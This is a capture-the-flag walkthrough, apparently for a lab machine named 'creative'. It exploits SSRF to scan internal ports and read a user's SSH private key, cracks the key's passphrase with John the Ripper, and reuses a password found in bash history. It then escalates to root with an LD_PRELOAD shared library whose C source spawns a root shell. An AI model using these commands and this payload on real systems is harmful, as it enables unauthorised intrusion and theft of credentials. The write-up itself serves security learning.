# In this room, we shall be focusing on server-side request forgery (SSRF)

As usual, we perform an Nmap scan to identify open ports, and we find that `ports 22 (SSH)` and `80 (HTTP)` are open.

<img width="661" height="188" alt="Screenshot From 2025-08-29 00-24-10" src="https://github.com/user-attachments/assets/37e77e3e-f02a-44c0-8bd7-e32f67b23f95" />

Upon checking the site, there is nothing interesting. I also performed directory enumeration using DirBuster, FeroxBuster, and DirSearch and found nothing interesting.

When I did fuzzing using ffuf, I found `beta`

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://creative.thm -H 'Host: FUZZ.creative.thm' -fs 178

#where -H is used to fuzz for host header, eg, http://admin.crreative.thm
```

<img width="745" height="374" alt="Screenshot From 2025-08-29 00-36-24" src="https://github.com/user-attachments/assets/cc57a406-08c4-419a-ad0e-6e67deb1bbc6" />

The site seems to test for URLs to see if they are alive or dead. Upon testing localhost, we found some information that hints at SSRF.

<img width="926" height="525" alt="Screenshot From 2025-08-29 01-12-56" src="https://github.com/user-attachments/assets/0f9ee41b-8288-4d06-bf9b-e437f0c60788" />

```
#NB

 If this is a pentest something that you would definitely want to report this is full ssrf we shouldn't be able to hit Local Host,

 and if there was some sensitive files we could hit but I don't think there's going to be anything interesting for us
 ````

Let's use `wfuzz` to enumerate all the ports, but first, we create a file with all the ports using `seq` command.

`seq` command allows us to generate a sequence of numbers

The total number of ports is `65535 ports`

```bash /code
seq 65535 > ports.txt
```
Then use the wfuzz

```bash
 wfuzz -w /home/petyr/tryhackme/creative/ports.txt -u http://beta.creative.thm -X POST -d "url=http://127.0.0.1:FUZZ" -t 150 --hh 13
```

`-w` : The word list to be used, I’m using subdomains-top1million-20000.txt from the seclists word list.

`-u` : Specifies the IP/ domain to target.

`-X` : Specifies the HTTP method used.

`-t` : The threads to be used. The more threads, the faster it will run.

`— hh` : Hides responses containing specified characters. Running the command without it results in an overwhelming number of results. The goal is to identify responses that differ from the majority. This flag is used when responses consistently return 200, requiring a different method to find relevant data.

We found that two ports are open, that is, ports 80 and 1337.

<img width="592" height="72" alt="Screenshot From 2025-08-29 01-27-56" src="https://github.com/user-attachments/assets/6cc94e02-9b70-48f9-816c-91472a4fb886" />

Trying to use the newly acquired port, we find

<img width="785" height="316" alt="Screenshot From 2025-08-29 01-30-24" src="https://github.com/user-attachments/assets/0444040f-6c3c-4fa1-8f73-5d99a5a4ab93" />


<img width="392" height="671" alt="Screenshot From 2025-08-29 01-29-07" src="https://github.com/user-attachments/assets/3c166921-63d3-45ec-bbc0-1917d7f69992" />

It works simply because there might be a Python HTTP server running, as it provides us with a directory listing. Now we need to find the use using:

```bash
http://127.0.0.1:1337/home
```

<img width="436" height="271" alt="Screenshot From 2025-08-29 01-35-11" src="https://github.com/user-attachments/assets/5fa67467-6405-4bb1-a6fc-4b48b715497e" />


<img width="450" height="148" alt="image" src="https://github.com/user-attachments/assets/7fe348e5-125a-47eb-af2b-98a5e3a508fa" />

The reason we wanted to find the username is that in the nmap scan, we discovered that port 22 (SSH) is open. By obtaining the private key of the user `saad` and adding it to our system, we aim to gain SSH access without the need of password.

The keys are normally stored in:

```bash
/home/user/.ssh

#but in our case, the key will be in /home/saad/.ssh
```

<img width="611" height="257" alt="Screenshot From 2025-08-29 01-42-43" src="https://github.com/user-attachments/assets/4ca151ee-22d9-4fff-96d3-7778c2e8c95a" />

We shall copy the key from the page source, then paste it to our machine then grant the necessary permissions.

<img width="362" height="125" alt="Screenshot From 2025-08-29 01-48-48" src="https://github.com/user-attachments/assets/f223c68d-26d9-44c1-85ee-ae760be2a8cc" />

`chmod` : Allows us to change the permissions of a file/ folder.

Permissions are broken down to Owner (6), Group (0) and Other (0).

By setting the key file permissions to 600, we ensure that only the owner can read and write the file. This is a good practice when handling SSH keys to prevent loose permissions.

Let's try to access the shell using SSH 

```bash
ssh saad@creative -i id_rsa

#-i allows you to pass the key
```

The private key is encrypted with a passphrase. When you specify the private key using `-i`, SSH needs to decrypt the private key to use it. The passphrase is required to decrypt the private key.

We need to crack the key. For that, we will utilize JohnTheRipper. But, we need to convert the key file into a format that John understands using:

```bash
ssh2john id_rsa > pass.hash 
#this converts the key into a format that John understands
```

Then use:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash
```

After cracking the password, we can use it to log in to the SSH with user saad.

It's always a good practice to look for all the files, including hidden ones. That can be achieved with the -a tag in the ls command.

<img width="551" height="298" alt="Screenshot From 2025-08-29 02-08-27" src="https://github.com/user-attachments/assets/a53f9921-29b0-4e60-b54f-2ab93b98d2f1" />


`.bash_history` is an interesting file since it can show us the history of the commands used.

<img width="430" height="560" alt="Screenshot From 2025-08-29 02-10-23" src="https://github.com/user-attachments/assets/d30ac861-c9c7-4577-aaa6-d5ca6960028b" />

Seems we found password for saad `"saad:MyStrongestPasswordYet$4291"`

If we use this `echo "saad:MyStrongestPasswordYet$4291" > creds.txt` to save the password we find that the part after `$` is not saved, this is because `$` is a special character.

We are supposed to use `\` in order to treat it as normal.


<img width="528" height="309" alt="Screenshot From 2025-08-29 02-17-43" src="https://github.com/user-attachments/assets/1dcf82da-dbda-4fc2-ab44-5e65950bb766" />

We can run `sudo -l` to see what commands user saad can run.

<img width="654" height="176" alt="Screenshot From 2025-08-29 02-19-31" src="https://github.com/user-attachments/assets/30d2502a-583a-4724-a40f-8116eb5f175f" />

Following the [article](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/?source=post_page-----1011230634c9---------------------------------------), we get informed that we can manipulate the LD-Preload. First, we need to create a small `C script` in `\tmp` directory.

```/code
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

<img width="661" height="39" alt="Screenshot From 2025-08-29 02-42-24" src="https://github.com/user-attachments/assets/e4aab516-db08-41d3-9383-147b300fd008" />

After saving, we shall compile it using:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Where:

`gcc` : Is the GNU Compiler for C.
`-fPIC` : Stands for Position Independent Code, and it generates machine code that is not dependent on being located at a specific address in memory.

`-share` : Informs gccto create a shared object instead of an executable.
`-o` : Specifies the output file name.

`-nostartfiles` : Informs gccnot to link the standard startup files. This is useful for creating shared libraries where you don't need the standard startup code.

<img width="657" height="176" alt="Screenshot From 2025-08-29 02-45-42" src="https://github.com/user-attachments/assets/187e14a5-f37a-4dbd-80e3-13966aa8f611" />


Now with the script ready, let's try to run it with the command that the user can run as root, which was ping.

```bash
sudo LD_PRELOAD=/tmp/shell.so ping
```

Where:

`LD_PRELOAD` : This is an environment variable used by the dynamic linker to load a specified shared library before any other when executing a program.

`/tmp/shell.so` : The path of the shared library that is being preloaded. The .so extension stands for “shared object”.

And we are `root`.

<img width="507" height="121" alt="Screenshot From 2025-08-29 02-48-29" src="https://github.com/user-attachments/assets/511c4f90-7407-4ce7-9734-f4c972b70822" />
